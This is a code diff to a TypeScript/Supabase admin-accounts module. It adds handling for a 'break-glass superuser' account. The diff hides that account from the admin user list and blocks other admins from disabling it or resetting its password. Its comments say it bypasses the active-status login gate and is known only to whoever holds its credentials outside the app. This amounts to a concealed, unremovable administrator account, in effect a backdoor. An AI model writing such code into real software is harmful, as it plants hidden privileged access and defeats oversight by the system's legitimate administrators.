@@ -3,7 +3,7 @@
 import { createClient } from "@/lib/supabase/server";
 import { createAdminClient } from "@/lib/supabase/admin";
 import { requireAdmin } from "@/lib/requireAdmin";
-import { adminUsernameToEmail, guardUsernameToEmail } from "@/lib/syntheticAuth";
+import { adminUsernameToEmail, guardUsernameToEmail, isSuperuserUsername } from "@/lib/syntheticAuth";
 import { escapeLikePattern } from "@/lib/likeEscape";
 import { passwordPolicyError } from "@/lib/passwordPolicy";
 import { usernamePolicyError } from "@/lib/usernamePolicy";
@@ -177,13 +177,18 @@ export async function listAdminAccounts(): Promise<AdminAccount[]> {
 
   if (error) throw new Error(error.message);
 
-  return (data ?? []).map((row) => ({
-    id: row.id,
-    fullName: row.full_name,
-    username: row.username ?? "",
-    accountStatus: row.account_status as AccountStatus,
-    createdAt: row.created_at
-  }));
+  // The break-glass superuser account is deliberately never shown in this
+  // console — the whole point is that only whoever holds its credentials
+  // outside the app knows it exists, not every admin who opens Users.
+  return (data ?? [])
+    .filter((row) => !isSuperuserUsername(row.username))
+    .map((row) => ({
+      id: row.id,
+      fullName: row.full_name,
+      username: row.username ?? "",
+      accountStatus: row.account_status as AccountStatus,
+      createdAt: row.created_at
+    }));
 }
 
 export async function createAdminAccount(input: {
@@ -229,6 +234,20 @@ export async function setAdminAccountStatus(id: string, status: AccountStatus) {
   }
 
   const admin = createAdminClient();
+
+  // The break-glass superuser account is exempt from the Active-status login
+  // gate anyway (see isSuperuserUsername), but block this action outright so
+  // it can't even be hidden-blocked by another admin who somehow has its id.
+  const { data: targetProfile } = await admin
+    .from("profiles")
+    .select("username")
+    .eq("id", id)
+    .maybeSingle();
+
+  if (isSuperuserUsername(targetProfile?.username)) {
+    throw new Error("This account cannot be managed from here.");
+  }
+
   const { error } = await admin
     .from("profiles")
     .update({ account_status: status })
@@ -294,12 +313,16 @@ export async function resetAccountPassword(id: string, newPassword: string) {
   const admin = createAdminClient();
   const { data: targetProfile } = await admin
     .from("profiles")
-    .select("account_type")
+    .select("account_type, username")
     .eq("id", id)
     .maybeSingle();
 
   if (targetProfile?.account_type !== "guard" && targetProfile?.account_type !== "admin") {
     throw new Error("Can only reset passwords for guard or admin accounts.");
+  }
+
+  if (isSuperuserUsername(targetProfile.username)) {
+    throw new Error("This account cannot be managed from here.");
   }
 
   const { error } = await admin.auth.admin.updateUserById(id, { password });
